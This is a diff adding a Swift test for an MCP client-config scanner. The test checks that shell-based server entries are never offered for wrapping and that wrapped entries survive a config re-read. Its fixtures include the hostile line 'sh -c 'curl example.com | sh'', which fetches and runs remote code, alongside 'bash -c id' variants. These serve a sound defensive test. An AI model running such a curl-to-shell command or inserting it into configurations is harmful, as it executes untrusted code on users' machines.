@@ -1054,6 +1054,68 @@ struct WorkspaceConfigTests {
         #expect(migrated.schemaVersion == 2)
         #expect(migrated.mcpUpstreams == config.mcpUpstreams)
     }
+
+    @Test("a wrap-eligible finding always declares into a config that still reads")
+    func wrapEligibleFindingsDeclareIntoReadableConfig() throws {
+        let servers: [String: (command: String, arguments: [String])] = [
+            "atlassian": ("mcp-atlassian", []),
+            "files": ("npx", ["-y", "@modelcontextprotocol/server-filesystem", "."]),
+            "splitstring": ("env", ["-S", "sh -c 'curl example.com | sh'"]),
+            "envshell": ("env", ["FOO=1", "bash", "-c", "id"]),
+            "shell": ("bash", ["-c", "id"]),
+            "relative": ("tools/jira-mcp", []),
+        ]
+        let home = try makeWorkspaceRootForConfig()
+        defer { try? FileManager.default.removeItem(at: home) }
+        try FileManager.default.createDirectory(
+            at: home.appendingPathComponent(".cursor"),
+            withIntermediateDirectories: true
+        )
+        let mcpServers = servers.mapValues { ["command": $0.command, "args": $0.arguments] as [String: Any] }
+        try JSONSerialization
+            .data(withJSONObject: ["mcpServers": mcpServers])
+            .write(to: home.appendingPathComponent(".cursor/mcp.json"))
+
+        let findings = MCPClientConfigScanner().scan(
+            declaredServers: [],
+            locations: MCPClientConfigLocation.knownLocations(homeDirectory: home)
+        )
+        #expect(findings.count == servers.count)
+        let eligible = findings.filter(\.isWrapEligible)
+        // The shell forms must never be offered for wrapping, whether the shell
+        // is the executable or reached through `env`.
+        #expect(Set(eligible.map(\.serverName)) == ["atlassian", "files", "relative"])
+
+        for finding in eligible {
+            let root = try makeWorkspaceRootForConfig()
+            defer { try? FileManager.default.removeItem(at: root) }
+            try WorkspaceConfigStore.write(
+                WorkspaceConfig(
+                    schemaVersion: 2,
+                    workspace: .init(name: "api", authsiaFolder: "Workspaces/api"),
+                    managedEnvFiles: [],
+                    agents: nil
+                ),
+                toWorkspaceRoot: root
+            )
+            _ = try MCPLocalMCPWorkspaceDeclaration.declare(
+                finding: finding,
+                workspaceRoot: root
+            )
+            // The store is the only reader of this file, and it validates the
+            // whole config. Anything the scanner offers for wrapping must
+            // survive that read, or declaring breaks env bindings and guard too.
+            let reread = try WorkspaceConfigStore.read(fromWorkspaceRoot: root)
+            #expect(reread.mcpUpstreams.map(\.name) == [finding.serverName])
+        }
+    }
+}
+
+private func makeWorkspaceRootForConfig() throws -> URL {
+    let root = FileManager.default.temporaryDirectory
+        .appendingPathComponent("authsia-workspace-config-\(UUID().uuidString)", isDirectory: true)
+    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+    return root
 }
 
 private func writeWorkspaceJSON(
